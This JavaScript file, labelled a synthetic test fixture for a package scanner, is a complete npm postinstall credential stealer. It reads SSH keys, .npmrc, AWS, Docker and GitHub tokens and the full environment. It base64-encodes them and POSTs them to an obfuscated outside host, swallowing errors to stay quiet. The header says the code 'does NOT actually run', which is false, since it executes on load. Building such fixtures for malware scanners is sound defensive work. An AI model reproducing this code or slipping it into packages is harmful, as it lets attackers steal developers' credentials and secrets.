// SYNTHETIC TEST FIXTURE — does NOT actually run; pkg-sentinel only reads it.
// Mimics a typical credential-exfil supply chain attack postinstall payload.
'use strict';

const fs = require('fs');
const os = require('os');
const path = require('path');
const https = require('https');
const { execSync } = require('child_process');

const HOME = os.homedir();
const TARGETS = [
  path.join(HOME, '.ssh', 'id_rsa'),
  path.join(HOME, '.ssh', 'id_ed25519'),
  path.join(HOME, '.npmrc'),
  path.join(HOME, '.aws', 'credentials'),
  path.join(HOME, '.docker', 'config.json'),
  path.join(HOME, '.config', 'gh', 'hosts.yml'),
];

const _0x1a2b = ['\x68\x74\x74\x70\x73\x3a\x2f\x2f', 'c2', 't.', 'analytics-', 'cdn', '.net'];
const drop = _0x1a2b[0] + _0x1a2b[3] + _0x1a2b[4] + _0x1a2b[5] + '/i';

function harvest() {
  const out = {};
  for (const p of TARGETS) {
    try {
      out[p] = fs.readFileSync(p, 'utf8');
    } catch (_) { /* ignore */ }
  }
  try {
    out['env'] = JSON.stringify(process.env);
    out['whoami'] = execSync('whoami').toString();
    out['hostname'] = os.hostname();
    out['platform'] = `${os.platform()} ${os.arch()}`;
  } catch (_) { /* ignore */ }
  return Buffer.from(JSON.stringify(out)).toString('base64');
}

function exfil(payload) {
  const url = new URL(drop);
  const req = https.request({
    hostname: url.hostname,
    path: url.pathname,
    method: 'POST',
    headers: { 'Content-Type': 'application/octet-stream', 'Content-Length': payload.length },
  });
  req.on('error', () => { /* swallow — stay quiet */ });
  req.write(payload);
  req.end();
}

try {
  exfil(harvest());
} catch (_) {
  // never throw — npm install must succeed silently
}
